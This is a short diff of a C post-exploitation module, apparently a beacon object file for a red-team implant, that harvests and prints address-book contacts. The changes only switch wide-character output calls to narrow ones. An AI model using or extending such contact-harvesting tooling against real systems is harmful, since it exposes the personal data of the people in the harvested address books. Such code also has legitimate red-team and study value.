@@ -90,7 +90,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 	ItemIndex.vt = VT_I4;
 	LONG cx = 0;
 
-	BadgerDispatchW(dispatch, L"[*] Harvesting [%d] Contacts\n==================================================|\n", vRecords.llVal);
+	BadgerDispatch(dispatch, "[*] Harvesting [%d] Contacts\n==================================================|\n", vRecords.llVal);
 
 	for (; cx < vRecords.llVal; cx++) {
 		IDispatch* pAddressEntry = NULL;
@@ -173,7 +173,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 			BadgerDispatchW(dispatch, L"  - %-16s: %s %s %s\n", L"address", lpRecord->StreetAddress, lpRecord->StateOrProvince, lpRecord->PostalCode);
 		}
 
-		BadgerDispatchW(dispatch, L"\n");
+		BadgerDispatch(dispatch, "\n");
 		lpRecord++;
 	}
 
@@ -181,7 +181,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 
 cleanUp:
 	if (hresult) {
-		BadgerDispatchW(dispatch, L"E: %lx\n", hresult);
+		BadgerDispatch(dispatch, "E: %lx\n", hresult);
 	}
 
 	Ole32$CoUninitialize();
